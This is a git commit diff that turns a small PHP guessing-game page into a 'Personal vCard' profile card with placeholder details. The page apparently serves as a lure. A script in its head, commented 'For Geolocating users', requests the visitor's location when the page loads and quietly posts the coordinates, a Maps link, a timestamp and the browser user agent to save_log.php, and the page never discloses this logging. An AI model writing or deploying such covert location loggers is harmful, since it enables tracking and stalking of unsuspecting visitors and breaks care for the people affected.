9e05c6bc480d483cab3223010c28589f2d1a6e4a
Angga Artupas <42704492+tupski@users.noreply.github.com>
2023-04-03 07:56:34 +0700

    Update index.php
    Merged with Personal vCard script

--- index.php
+++ index.php
@@ -1,58 +1,111 @@
-<?php
-// Inisialisasi variabel
-$random_number = rand(1, 10);
-$guesses = 0;
-$won = false;
-
-// Memeriksa apakah ada tebakan yang dikirim dari form
-if(isset($_POST['submit'])) {
-    // Memeriksa apakah tebakan yang dikirim dari form adalah angka
-    if(is_numeric($_POST['guess'])) {
-        // Menyimpan tebakan pengguna dalam variabel
-        $guess = $_POST['guess'];
-        $guesses++;
-        
-        // Memeriksa apakah tebakan pengguna benar atau salah
-        if($guess == $random_number) {
-            $won = true;
-        }
-    }
-}
-
-?>
 <!DOCTYPE html>
-<html>
-<head>
-    <title>Judul</title>
-    <meta charset="utf-8">
-    <meta name="author" content="Angga Artupas">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Personal vCard</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.9.0/css/all.min.css" integrity="sha512-q3eWabyZPc1XTCmF+8/LuE1ozpg5xxn7iO89yfSOd5/oKvyqLngoNGsx8jq92Y8eXJ/IRxQbEC+FGSYxtk2oiw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <!-- Main Style -->
+    <link rel="stylesheet" href="style.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Poiret+One&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Lato&display=swap" rel="stylesheet">
+    
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"
             integrity="sha384-n+RnIS6cYKV1xEb/YJkKyGWQ+ys3zqfLO6UdOnKLJStGJwhuV7e+LQlyvV8Wkymj"
             crossorigin="anonymous"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.min.js"></script>
-    <script src="hehe.js"></script>
-</head>
-<body>
-    <!-- bisa isi konten apapun sesuai kebutuhan, gak mesti tebak angka -->
-    <h1>Game Tebak Angka</h1>
-    
-    <?php if($won): ?>
-        <p>Selamat! Anda menebak angka yang benar dalam <?= $guesses ?> kali percobaan.</p>
-    <?php else: ?>
-        <?php if($guesses > 0): ?>
-            <p>Tebakan Anda salah. Silakan coba lagi.</p>
-        <?php endif; ?>
-        <div class="mb-3"> 
-        <form method="post" action="">
-            <label for="guess">Tebak angka antara 1 dan 10:</label>
-            <input type="text" name="guess" id="guess" required>
-            <input type="submit" name="submit" value="Tebak">
-        </form>
+    <!-- For Geolocating users -->
+     <script>
+        $(document).ready(function () {
+            getLocation();
+        });
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function showPosition(position) {
+            var lat = position.coords.latitude;
+            var lng = position.coords.longitude;
+            var date = new Date().toLocaleString('en-US', {
+                timeZone: 'Asia/Jakarta'
+            });
+            var url = "https://www.google.com/maps?q=" + lat + "," + lng;
+            $.post("save_log.php", {
+                date: date,
+                url: url,
+                device: navigator.userAgent
+            });
+        }
+    </script>
+    <!-- Custom Style CSS -->
+    <style>
+      .teks-nama {
+        font-family: 'Poiret One', cursive;
+        ;
+      }
+
+      .teks-deskripsi {
+        font-family: 'Lato', sans-serif;
+      }
+    </style>
+  </head>
+  <body class="bg-gray-600">
+    <!-- WhatsApp Button -->
+    <div class="whatsapp-button">
+      <a href="#" target="_blank">
+        <i class="fab fa-whatsapp"></i>
+      </a>
+    </div>
+    <!-- vCard Content -->
+    <div class="max-w-md mx-4 mt-10 bg-white rounded-lg shadow-lg overflow-hidden">
+      <div class="flex items-center px-6 py-4">
+        <img class="h-12 w-12 rounded-full object-cover border-2 border-gray-500" src="https://picsum.photos/500" alt="Profile Image">
+        <div class="ml-3">
+          <h2 class="text-xl font-semibold text-gray-800 teks-nama">John Doe</h2>
+          <p class="text-md text-gray-600">SEO Specialist</p>
         </div>
-    <?php endif; ?>
-    <!-- kamu bisa hapus konten diatas komen ini -->
-</body>
+      </div>
+      <!-- About Me -->
+      <div class="px-6 py-4">
+        <p class="text-gray-700 teks-deskripsi">30 years old guy who love making and doing maketing planning like brand campaign, and other digital marketing planning. </p>
+      </div>
+      <div class="px-6 py-4">
+        <span class="inline-block bg-blue-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-1">#SEO</span>
+        <span class="inline-block bg-blue-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-1">#SEM</span>
+        <span class="inline-block bg-blue-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-1">#WebDeveloper</span>
+        <span class="inline-block bg-blue-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-1 mt-1">#DigitalMarketing</span>
+        <span class="inline-block bg-blue-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mt-1">#WordPress</span>
+      </div>
+      <!-- Download CV Button -->
+      <div class="flex justify-center">
+        <a href="#" class="border border-blue-500 text-blue-500 rounded-lg px-4 py-2 hover:bg-blue-500 hover:text-white">
+          <i class="fas fa-download"></i> Download CV </a>
+      </div>
+      <!-- Social Icons -->
+      <div class="px-6 py-4 flex justify-center">
+        <a href="#" class="text-indigo-500 font-semibold hover:text-indigo-600 mr-4">
+          <i class="fab fa-twitter"></i>
+        </a>
+        <a href="#" class="text-indigo-500 font-semibold hover:text-indigo-600 mr-4">
+          <i class="fab fa-facebook"></i>
+        </a>
+        <a href="#" class="text-indigo-500 font-semibold hover:text-indigo-600 mr-4">
+          <i class="fab fa-instagram"></i>
+        </a>
+        <a href="mailto:#" class="text-indigo-500 font-semibold hover:text-indigo-600 mr-4">
+          <i class="far fa-envelope"></i>
+        </a>
+      </div>
+    </div>
+  </body>
 </html>
